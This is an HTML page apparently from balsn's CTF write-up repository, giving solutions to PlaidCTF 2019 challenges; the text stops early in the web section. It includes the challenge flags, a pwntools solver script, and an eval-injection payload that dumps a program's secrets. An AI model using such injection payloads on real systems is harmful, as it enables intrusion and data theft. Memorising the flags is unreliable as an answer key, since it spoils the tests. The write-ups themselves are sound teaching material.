@@ -1,0 +1,1317 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>PlaidCTF 2019</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#sanity-check">sanity-check</a>
+    
+                <a class="dropdown-item" href="#docker">docker</a>
+    
+                <a class="dropdown-item" href="#everland">everland</a>
+    
+                <a class="dropdown-item" href="#can-you-guess-me">can-you-guess-me</a>
+    
+                <a class="dropdown-item" href="#space-saver">space-saver</a>
+    
+                <a class="dropdown-item" href="#a-whaley-good-joke">a-whaley-good-joke</a>
+    
+                <a class="dropdown-item" href="#project-eulernt">project-eulernt</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                reversing
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#the-.wat-ness">the-.wat-ness</a>
+    
+                <a class="dropdown-item" href="#plaid-party-planning-iii">plaid-party-planning-iii</a>
+    
+                <a class="dropdown-item" href="#big-maffs">big-maffs</a>
+    
+                <a class="dropdown-item" href="#i-can-count">i-can-count</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#triggered">triggered</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwnable
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#splaid-birch">splaid-birch</a>
+    
+                <a class="dropdown-item" href="#spectre">spectre</a>
+    
+                <a class="dropdown-item" href="#suffarring">suffarring</a>
+    
+                <a class="dropdown-item" href="#cppp">cppp</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#splaid-cypress">splaid-cypress</a>
+    
+                <a class="dropdown-item" href="#horst">horst</a>
+    
+                <a class="dropdown-item" href="#r-u-sad?">r-u-sad?</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#sanity-check" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">sanity-check</span>
+            </a>
+    
+<a href="#docker" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">docker</span>
+            </a>
+    
+<a href="#everland" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">everland</span>
+            </a>
+    
+<a href="#can-you-guess-me" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">can-you-guess-me</span>
+            </a>
+    
+<a href="#space-saver" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">space-saver</span>
+            </a>
+    
+<a href="#a-whaley-good-joke" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">a-whaley-good-joke</span>
+            </a>
+    
+<a href="#project-eulernt" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">project-eulernt</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">reversing</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#the-.wat-ness" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">the-.wat-ness</span>
+            </a>
+    
+<a href="#plaid-party-planning-iii" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">plaid-party-planning-iii</span>
+            </a>
+    
+<a href="#big-maffs" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">big-maffs</span>
+            </a>
+    
+<a href="#i-can-count" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">i-can-count</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#triggered" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">triggered</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwnable</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#splaid-birch" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">splaid-birch</span>
+            </a>
+    
+<a href="#spectre" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">spectre</span>
+            </a>
+    
+<a href="#suffarring" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">suffarring</span>
+            </a>
+    
+<a href="#cppp" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">cppp</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            <a href="#splaid-cypress" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">splaid-cypress</span>
+            </a>
+    
+<a href="#horst" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">horst</span>
+            </a>
+    
+<a href="#r-u-sad?" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">r-u-sad?</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="plaidctf-2019"><a class="header-link" href="#plaidctf-2019"></a>PlaidCTF 2019</h1>
+
+<h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
+<h3 id="sanity-check"><a class="header-link" href="#sanity-check"></a>Sanity Check</h3>
+<p><code>PCTF{welcome to PlaidCTF}</code></p>
+<h3 id="docker"><a class="header-link" href="#docker"></a>docker</h3>
+<ul class="list">
+<li><code>docker pull whowouldeverguessthis/public</code></li>
+<li><code>grep -R &#39;PCTF&#39; /var/lib/docker/</code></li>
+<li><code>PCTF{well_it_isnt_many_points_what_did_you_expect}</code></li>
+</ul>
+<h3 id="everland"><a class="header-link" href="#everland"></a>Everland</h3>
+<p>According to <code>capture move</code>, it will capture the enemy and do <code>play_game</code> with the next enemy.</p>
+<pre class="hljs"><code>    <span class="hljs-keyword">if</span> (!should_capture) <span class="hljs-keyword">andalso</span> (not (!has_captured)) 
+    <span class="hljs-keyword">then</span>
+      <span class="hljs-keyword">if</span> (!e_h &gt; <span class="hljs-number">50</span>) <span class="hljs-keyword">then</span>
+        (<span class="hljs-type">TextIO</span>.print (<span class="hljs-string">"It was too strong, you failed to capture "</span>^
+          (color e_name <span class="hljs-type">ORANGE</span>));
+        enemy)
+      <span class="hljs-keyword">else</span>
+      <span class="hljs-keyword">let</span>
+        <span class="hljs-keyword">val</span> _ = should_capture := <span class="hljs-literal">false</span>
+        <span class="hljs-keyword">val</span> _ = has_captured := <span class="hljs-literal">true</span>
+        <span class="hljs-keyword">val</span> _ = captured := enemy
+        <span class="hljs-comment">(* Kill them so that you can heal yourself *)</span>
+        <span class="hljs-keyword">fun</span> sacrifice_fn (my_h, my_s, their_h, their_s) =
+          (<span class="hljs-keyword">fn</span> <span class="hljs-literal">()</span> =&gt; (
+             my_h := min((!my_h)+min(!e_h, !my_s*<span class="hljs-number">10</span>), player_max);
+             e_h  := (!e_h-(!my_h)*<span class="hljs-number">10</span>);
+
+             p_ms := <span class="hljs-type">List</span>.filter (<span class="hljs-keyword">fn</span> (n, _) =&gt; n &lt;&gt; <span class="hljs-string">"Sacrifice"</span>) (!p_ms)),
+           <span class="hljs-keyword">fn</span> <span class="hljs-literal">()</span> =&gt; <span class="hljs-literal">()</span>) <span class="hljs-comment">(* Only used by the AI, not us *)</span>
+        <span class="hljs-keyword">val</span> _ = p_ms := (<span class="hljs-type">List</span>.filter (<span class="hljs-keyword">fn</span> (n, _) =&gt; n &lt;&gt; <span class="hljs-string">"Capture"</span>) (!p_ms))
+                        @[(<span class="hljs-string">"Sacrifice"</span>, sacrifice_fn)]
+      <span class="hljs-keyword">in</span>
+        next
+      <span class="hljs-keyword">end</span>
+</code></pre><p>In the end, <code>find_best</code> will chose the enemy wich has the maximum strength amoung all enemies, and make the enemy chosen become <code>Posessed enemy</code>.</p>
+<pre class="hljs"><code><span class="hljs-keyword">fun</span> find_best (this <span class="hljs-keyword">as</span> (<span class="hljs-type">Opponent</span> (_, my_s, _, _, next))) best entity =
+  <span class="hljs-keyword">if</span> (!my_s) &gt; best <span class="hljs-keyword">then</span> find_best next (!my_s) this
+                    <span class="hljs-keyword">else</span> find_best next best entity
+  | find_best _ _ entity = entity
+</code></pre><p>If we can capture the enemy with max strength, we can de <code>sacrifice_fn</code> of it, then kill the posessed enemy.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+<span class="hljs-comment"># PCTF{just_be_glad_i_didnt_arm_cpt_hook_with_GADTs}</span>
+
+host , port = <span class="hljs-string">'everland.pwni.ng'</span> , <span class="hljs-number">7772</span>
+y = remote( host , port )
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sp</span><span class="hljs-params">( p )</span>:</span>
+    y.sendlineafter( <span class="hljs-string">'&gt;'</span> , p )
+
+y.sendlineafter( <span class="hljs-string">'?'</span> , <span class="hljs-string">'yuawn'</span> )
+
+<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range( <span class="hljs-number">5</span> ):
+   sp( <span class="hljs-string">'forage'</span> )
+
+sp( <span class="hljs-string">'use'</span> )
+sp( <span class="hljs-string">'1'</span> )
+
+sp( <span class="hljs-string">'use'</span> )
+sp( <span class="hljs-string">'3'</span> )
+
+<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range( <span class="hljs-number">3</span> ):
+    sp( <span class="hljs-string">'fight'</span> )
+    sp( <span class="hljs-string">'2'</span> )
+
+sp( <span class="hljs-string">'fight'</span> )
+sp( <span class="hljs-string">'4'</span> )
+
+sp( <span class="hljs-string">'fight'</span> )
+sp( <span class="hljs-string">'4'</span> )
+<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range( <span class="hljs-number">9</span> ):
+    sp( <span class="hljs-string">'fight'</span> )
+    sp( <span class="hljs-string">'2'</span> )
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range( <span class="hljs-number">8</span> ):
+    sp( <span class="hljs-string">'fight'</span> )
+    sp( <span class="hljs-string">'4'</span> )
+    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range( <span class="hljs-number">7</span> ):
+        sp( <span class="hljs-string">'fight'</span> )
+        sp( <span class="hljs-string">'2'</span> )
+
+
+sp( <span class="hljs-string">'fight'</span> )
+sp( <span class="hljs-string">'5'</span> )
+
+y.interactive()
+</code></pre><h3 id="can-you-guess-me"><a class="header-link" href="#can-you-guess-me"></a>can you guess me</h3>
+<pre class="hljs"><code><span class="hljs-comment">#! /usr/bin/env python3</span>
+
+<span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> exit
+<span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> secret_value_for_password, flag, <span class="hljs-keyword">exec</span>
+
+<span class="hljs-keyword">try</span>:
+    val = <span class="hljs-number">0</span>
+    inp = input(<span class="hljs-string">"Input value: "</span>)
+    count_digits = len(set(inp))
+    <span class="hljs-keyword">if</span> count_digits &lt;= <span class="hljs-number">10</span>:          <span class="hljs-comment"># Make sure it is a number</span>
+        val = eval(inp)
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">raise</span>
+
+    <span class="hljs-keyword">if</span> val == secret_value_for_password:
+        print(flag)
+    <span class="hljs-keyword">else</span>:
+        print(<span class="hljs-string">"Nope. Better luck next time."</span>)
+<span class="hljs-keyword">except</span>:
+    print(<span class="hljs-string">"Nope. No hacking."</span>)
+    exit(<span class="hljs-number">1</span>)
+</code></pre><p>Just print the python values: <code>print(vars())</code>, the payload satisfy the limitation of numbers of set.</p>
+<pre class="hljs"><code>{<span class="hljs-string">'__name__'</span>: <span class="hljs-string">'__main__'</span>, <span class="hljs-string">'__doc__'</span>: None, <span class="hljs-string">'__package__'</span>: None, <span class="hljs-string">'__loader__'</span>:
+&lt;_frozen_importlib_external.SourceFileLoader object at <span class="hljs-number">0</span>x7f5008e579e8&gt;, 
+<span class="hljs-string">'__spec__'</span>: None, <span class="hljs-string">'__annotations__'</span>: {}, <span class="hljs-string">'__builtins__'</span>: &lt;module <span class="hljs-string">'builtins'</span> (built-<span class="hljs-keyword">in</span>)&gt;,
+<span class="hljs-string">'__file__'</span>: <span class="hljs-string">'/home/guessme/can-you-guess-me.py'</span>, <span class="hljs-string">'__cached__'</span>: 
+None, <span class="hljs-string">'exit'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> <span class="hljs-keyword">exit</span>&gt;, 
+<span class="hljs-string">'secret_value_for_password'</span>: <span class="hljs-string">'not even a number; this is a damn string; and it has all 26 characters of the alphabet; abcdefghijklmnopqrstuvwxyz; lol'</span>, 
+<span class="hljs-string">'flag'</span>: <span class="hljs-string">'PCTF{hmm_so_you_were_Able_2_g0lf_it_down?_Here_have_a_flag}'</span>, 
+<span class="hljs-string">'exec'</span>: &lt;<span class="hljs-keyword">function</span> exec at <span class="hljs-number">0</span>x7f5008da0158&gt;, 
+<span class="hljs-string">'val'</span>: <span class="hljs-number">0</span>, <span class="hljs-string">'inp'</span>: <span class="hljs-string">'print(vars())'</span>, <span class="hljs-string">'count_digits'</span>: <span class="hljs-number">10</span>}
+</code></pre><ul class="list">
+<li><code>PCTF{hmm_so_you_were_Able_2_g0lf_it_down?_Here_have_a_flag}</code></li>
+</ul>
+<h3 id="space-saver"><a class="header-link" href="#space-saver"></a>Space Saver</h3>
+<p>We&#39;re given a disk image. By using binwalk, we know there are some pictures and an encypted rar file inside the image. After extracting those files, we use zsteg to examine those pictures, and found that they all contain some plaintext, which look pretty suspicious. After we concatenate those plaintext and treat it as the rar&#39;s password, we successfully decrypted and decompressed the rar file, which gave us the flag ( a png file ): <code>PCTF{2pac3_3v34ry_wh3r3}</code>.</p>
+<h3 id="a-whaley-good-joke"><a class="header-link" href="#a-whaley-good-joke"></a>A Whaley Good Joke</h3>
+<p>The challenge is a tar.gz compressed file. After we decompressed it, we found there were many folders, which all contains a json file and a <code>layer.tar</code> file.</p>
+<p>By checking the <code>repositories</code> text file, we know that the latest layer is in the folder <code>24d12bbeb0a9fd321a8decc0c544f84bf1f6fc2fd69fa043602e012e3ee6558b</code>. By decompressing the <code>layer.tar</code> in that folder, we found a <code>flag.sh</code>:</p>
+<pre class="hljs"><code><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..32}
+<span class="hljs-keyword">do</span>
+    <span class="hljs-built_in">test</span> <span class="hljs-_">-f</span> <span class="hljs-variable">$i</span>
+    <span class="hljs-keyword">if</span> [[ $? <span class="hljs-_">-ne</span> 0 ]]
+    <span class="hljs-keyword">then</span>
+        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Missing file <span class="hljs-variable">$i</span> - no flag for you!"</span>
+        <span class="hljs-built_in">exit</span>
+    <span class="hljs-keyword">fi</span>
+<span class="hljs-keyword">done</span>
+
+<span class="hljs-built_in">echo</span> pctf{1_b3t$(cat 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32)}
+</code></pre><p>So we can see that there should be 32 files ( which contains a single character in each file ) after we decompress all the <code>layer.tar</code> in each folders. Also by examine the json file in each folder, we can infer the relationship between each layer ( some of them doesn&#39;t contain the info though, we&#39;ll have to guess ). </p>
+<p>After we decompressed all the <code>layer.tar</code>, get all the required files and put those characters together ( require some guessing ), we finally got the flag: <code>pctf{1_b3t_u_couldnt_c0nt4in3r_ur_l4ught3r}</code></p>
+<h3 id="project-eulernt"><a class="header-link" href="#project-eulernt"></a>Project Eulernt</h3>
+<p>We need to search a integer x so that </p>
+<ol class="list">
+<li>333! % x == 0</li>
+<li>x is close enough to $\sqrt{333!}$</li>
+</ol>
+<p>We start with $x = 188!$, and keep making $\sqrt{333!} / x$ closer to 1.</p>
+<pre class="hljs"><code>#!/usr/bin/<span class="hljs-keyword">python</span>
+import gmpy2
+from gmpy2 import mpz
+
+def factors(n):
+    result = <span class="hljs-keyword">set</span>()
+    n = mpz(n)
+    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, gmpy2.isqrt(n) + <span class="hljs-number">1</span>):
+        div, <span class="hljs-keyword">mod</span> = divmod(n, i)
+        <span class="hljs-keyword">if</span> not <span class="hljs-keyword">mod</span>:
+            result |= {mpz(i), div}
+    <span class="hljs-keyword">return</span> result
+
+n = gmpy2.fac(<span class="hljs-number">333</span>)
+<span class="hljs-keyword">y</span> = <span class="hljs-keyword">int</span>(gmpy2.isqrt(n))
+
+start = <span class="hljs-keyword">int</span>(gmpy2.fac(<span class="hljs-number">188</span>))
+# start * <span class="hljs-number">11.99</span>..... == <span class="hljs-keyword">y</span>
+start *= <span class="hljs-number">12</span>
+# we keep searching <span class="hljs-keyword">z</span> <span class="hljs-keyword">so</span> that (<span class="hljs-keyword">y</span> / (start * <span class="hljs-keyword">x</span>)) become closer <span class="hljs-keyword">to</span> <span class="hljs-number">1</span>.
+# the goal <span class="hljs-keyword">is</span> <span class="hljs-keyword">int</span>((<span class="hljs-keyword">y</span> / (start * <span class="hljs-keyword">x</span>)) * <span class="hljs-number">1</span>e8) == <span class="hljs-number">100000000</span>
+
+start //= <span class="hljs-number">10000000000</span>
+# now we <span class="hljs-built_in">search</span> <span class="hljs-keyword">x</span> from <span class="hljs-keyword">int</span>(<span class="hljs-keyword">y</span> / (start))
+
+<span class="hljs-keyword">x</span> = <span class="hljs-keyword">int</span>(<span class="hljs-keyword">y</span> / (start))
+<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
+    # We run two script simultaneously
+    # one <span class="hljs-keyword">is</span> <span class="hljs-keyword">x</span> += <span class="hljs-number">1</span>, <span class="hljs-keyword">while</span> the other <span class="hljs-keyword">is</span> <span class="hljs-keyword">x</span> -= <span class="hljs-number">1</span>
+    <span class="hljs-keyword">x</span> -= <span class="hljs-number">1</span>
+    <span class="hljs-keyword">ret</span> = <span class="hljs-keyword">list</span>(factors(<span class="hljs-keyword">x</span>))
+    ans = []
+    <span class="hljs-keyword">sign</span> = <span class="hljs-number">1</span>
+    <span class="hljs-keyword">for</span> i in re<span class="hljs-variable">t:</span>
+        <span class="hljs-keyword">if</span> gmpy2.is_prime(i):
+            ans.<span class="hljs-keyword">append</span>(i)
+            <span class="hljs-keyword">if</span> i &gt; <span class="hljs-number">333</span>:
+                <span class="hljs-keyword">sign</span> = <span class="hljs-number">0</span>
+                <span class="hljs-keyword">break</span>
+
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">sign</span> <span class="hljs-built_in">and</span> n % (start * <span class="hljs-keyword">x</span>) == <span class="hljs-number">0</span>:
+        <span class="hljs-keyword">print</span> (<span class="hljs-string">'x : '</span>, <span class="hljs-keyword">x</span>)
+        <span class="hljs-keyword">print</span> (<span class="hljs-string">'ans : '</span>, start * <span class="hljs-keyword">x</span>)
+        <span class="hljs-keyword">exit</span>()
+</code></pre><h2 id="reversing"><a class="header-link" href="#reversing"></a>Reversing</h2>
+<h3 id="the-.wat-ness"><a class="header-link" href="#the-.wat-ness"></a>The .WAT ness</h3>
+<p>This challenge probably inspired by the game <a href="https://en.wikipedia.org/wiki/The_Witness_(2016_video_game">The Witness</a>).
+It&#39;s a puzzle game, you have to solve 5 rounds within certain time limit in order to get the flag.</p>
+<p class="img-container"><img src="https://i.imgur.com/gXbm60B.png" alt="Puzzle preview"></p>
+<p>You may notice the server request a webasm. This webasm will do all the constraints checking for the puzzle. However, I didn&#39;t take much time on reversing the webasm because I think it will be much more easier for me to figure the rules out by playing numerous of times. xD</p>
+<p>There are 6 types of constraints:</p>
+<ol class="list">
+<li>Circle - Different color circle should not be in the same region.</li>
+<li>Double Circle - One region can only have one pair of same color circle/double circle.</li>
+<li>Tetris block (yellow) - The region must fit that kind of tetris block.</li>
+<li>Edge block (teal) - The number of edge you should passby for that block.</li>
+<li>Triangle - <del>Must passby the bottom edge of the block (maybe?).</del> After asking 217, (passby edge + 2) % 3 + 1 = number of triangle in a region.</li>
+<li>Rectangle - Can&#39;t passby the edge of the block.</li>
+</ol>
+<p>P/S: The BGM made me crazy! &gt;:(</p>
+<p><code>pctf{what_if_i_made_firmament_instead}</code></p>
+<h3 id="plaid-party-planning-iii"><a class="header-link" href="#plaid-party-planning-iii"></a>Plaid Party Planning III</h3>
+<p>The binary simulates 15 people having a meal together. Each thread represents one person, and each person has their own style (the order of grabbing/putting back the food).
+There are 15 different seats, and you can only take the (five, to be precise) food near your seat.
+The goal is to give a seat order so that deadlock will not happen.</p>
+<p>However, in this challenge, just patch the binary [0x180b:0x18e7] to <code>nop</code>, then you will get the flag. (The author released a new challenge for the fixed version after that.)</p>
+<p><code>PCTF{1 l1v3 1n th3 1nt3rs3ct1on of CSP and s3cur1ty and parti3s!}</code></p>
+<h3 id="big-maffs"><a class="header-link" href="#big-maffs"></a>big maffs</h3>
+<p><a href="https://sasdf.cf/ctf/writeup/2019/plaid/rev/bigmaffs/">Detailed writeup</a></p>
+<h4 id="tl;dr"><a class="header-link" href="#tl;dr"></a>TL;DR</h4>
+<ol class="list">
+<li>Reverse the binary</li>
+<li>Find a isomorphism between that strange numeral system and Z (Integer Group).</li>
+<li>Calculate modular Ackermann function.</li>
+<li>Reduce the exponent using euler&#39;s totient.</li>
+</ol>
+<p>It&#39;s a binary that will calculate the flag.
+But it needs enormous memory and time.</p>
+<p>It use a strange numeral system, and we figure out that it can be transform into 256-based integer with a pre-generated mapping of 0-256.</p>
+<p>After that we found that the binary is calculating Ackermann function mod some integer.</p>
+<p>So all we need to do is calculate that value with some horrible number theory blackmagic.
+If you are a pure reversing guy, you may want to skip this.
+Otherwise, see our <a href="https://sasdf.cf/ctf/writeup/2019/plaid/rev/bigmaffs/">detailed writeup here</a>.</p>
+<h3 id="i-can-count"><a class="header-link" href="#i-can-count"></a>i can count</h3>
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="triggered"><a class="header-link" href="#triggered"></a>Triggered</h3>
+<p>This challenge give us a plpgsql microservice.</p>
+<p>Our request, response, cookie, session will be processed with plpgsql.</p>
+<p>The plpgsql source code is in <a href="http://triggered.pwni.ng:52856/static/schema.sql">http://triggered.pwni.ng:52856/static/schema.sql</a></p>
+<p>And the vulnerability is under the login trigger/ function:</p>
+<pre class="hljs"><code><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> web.session (
